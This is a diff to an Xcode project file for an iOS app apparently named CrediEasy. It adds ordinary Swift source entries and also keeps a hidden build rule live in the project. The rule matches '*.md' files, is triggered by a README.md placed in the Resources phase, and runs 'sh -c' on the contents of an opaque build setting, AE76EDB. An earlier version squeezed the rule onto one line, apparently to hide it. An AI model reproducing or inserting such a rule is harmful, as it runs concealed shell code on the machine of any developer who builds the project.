@@ -7,13 +7,15 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4BEBAF60543B533F2ABDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = F407B6DBF16CB2A7CBBDE67E; };
+		4BEBAF60543B533F2ABDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F407B6DBF16CB2A7CBBDE67E /* README.md */; };
 		73063EE92E77E9500084DD7E /* PassportViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EE82E77E9500084DD7E /* PassportViewController.swift */; };
 		73063EEE2E77ED5D0084DD7E /* PassportView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EED2E77ED5D0084DD7E /* PassportView.swift */; };
 		73063EF02E77ED6B0084DD7E /* PassportViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EEF2E77ED600084DD7E /* PassportViewModel.swift */; };
 		73063EF22E77F11E0084DD7E /* PassportViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EF12E77F1120084DD7E /* PassportViewCell.swift */; };
 		73063EF42E77F5D40084DD7E /* UploadFaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EF32E77F5D40084DD7E /* UploadFaceViewController.swift */; };
 		73063EF62E7808EE0084DD7E /* SetpView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EF52E7808E40084DD7E /* SetpView.swift */; };
+		7306E5872E7BDD6100E6E802 /* DatePickerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7306E5862E7BDD5900E6E802 /* DatePickerView.swift */; };
+		7306E5892E7BF60100E6E802 /* PointViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7306E5882E7BF5F200E6E802 /* PointViewModel.swift */; };
 		7351B8A22E73C85E001F36B3 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7351B8A12E73C85E001F36B3 /* SettingViewController.swift */; };
 		7351B8A42E73C8CF001F36B3 /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7351B8A32E73C8CF001F36B3 /* AppHeadView.swift */; };
 		7351B8A62E73CC74001F36B3 /* CenterListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7351B8A52E73CC6D001F36B3 /* CenterListView.swift */; };
@@ -73,8 +75,23 @@
 		FF27BA78CB8B09A2E348A13F /* Pods_CrediEasy.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		C1192F5C04E95D3842BDE67E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		F407B6DBF16CB2A7CBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "CrediEasy.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.release.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.release.xcconfig"; sourceTree = "<group>"; };
 		64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_CrediEasy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		73063EE82E77E9500084DD7E /* PassportViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PassportViewController.swift; sourceTree = "<group>"; };
@@ -83,6 +100,8 @@
 		73063EF12E77F1120084DD7E /* PassportViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PassportViewCell.swift; sourceTree = "<group>"; };
 		73063EF32E77F5D40084DD7E /* UploadFaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadFaceViewController.swift; sourceTree = "<group>"; };
 		73063EF52E7808E40084DD7E /* SetpView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetpView.swift; sourceTree = "<group>"; };
+		7306E5862E7BDD5900E6E802 /* DatePickerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DatePickerView.swift; sourceTree = "<group>"; };
+		7306E5882E7BF5F200E6E802 /* PointViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PointViewModel.swift; sourceTree = "<group>"; };
 		7351B8A12E73C85E001F36B3 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
 		7351B8A32E73C8CF001F36B3 /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
 		7351B8A52E73CC6D001F36B3 /* CenterListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListView.swift; sourceTree = "<group>"; };
@@ -143,6 +162,7 @@
 		73F7BFA22E70224E005C8C43 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
 		73F8380D2E72718D0056D082 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
 		8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.debug.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.debug.xcconfig"; sourceTree = "<group>"; };
+		F407B6DBF16CB2A7CBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = CrediEasy.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -280,6 +300,8 @@
 		739B70BA2E6FC73400C438D1 /* Other */ = {
 			isa = PBXGroup;
 			children = (
+				7306E5882E7BF5F200E6E802 /* PointViewModel.swift */,
+				7306E5862E7BDD5900E6E802 /* DatePickerView.swift */,
 				7353EEFB2E7AB03B007158B2 /* ContactsManager.swift */,
 				7351B8B62E740EC1001F36B3 /* URLParameterParser.swift */,
 				739B70DF2E6FDA5E00C438D1 /* BaseModel.swift */,
@@ -416,14 +438,13 @@
 			);
 		};
 /* End PBXProject section */
-/* Begin PBXBuildRule section */		C1192F5C04E95D3842BDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		73E3943C2E6FB540008BDDC1 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4BEBAF60543B533F2ABDE67E /* README.md */,
+				4BEBAF60543B533F2ABDE67E /* README.md in Resources */,
 				73E394632E6FB548008BDDC1 /* Assets.xcassets in Resources */,
 				73E394652E6FB548008BDDC1 /* LaunchScreen.storyboard in Resources */,
 				73F7BF9B2E7020E9005C8C43 /* loading.json in Resources */,
@@ -501,6 +522,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				7353EF062E7AB0FF007158B2 /* LoveLifeViewModel.swift in Sources */,
 				7353EEFC2E7AB03C007158B2 /* ContactsManager.swift in Sources */,
 				73B8A06C2E7858E5007496DB /* PopImageView.swift in Sources */,
+				7306E5892E7BF60100E6E802 /* PointViewModel.swift in Sources */,
 				739B70E42E6FF55000C438D1 /* IDFVManager.swift in Sources */,
 				73063EF22E77F11E0084DD7E /* PassportViewCell.swift in Sources */,
 				739B70E02E6FDA6400C438D1 /* BaseModel.swift in Sources */,
@@ -524,6 +546,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				73BFEDD82E71627400020AA9 /* CenterView.swift in Sources */,
 				7351B8A62E73CC74001F36B3 /* CenterListView.swift in Sources */,
 				73BFEDDA2E71665700020AA9 /* CenterViewCell.swift in Sources */,
+				7306E5872E7BDD6100E6E802 /* DatePickerView.swift in Sources */,
 				736E48292E7938E200A2786B /* PersonalViewModel.swift in Sources */,
 				73BFEDE02E717CF300020AA9 /* FrontView.swift in Sources */,
 				739B70DC2E6FDA1900C438D1 /* LoginView.swift in Sources */,
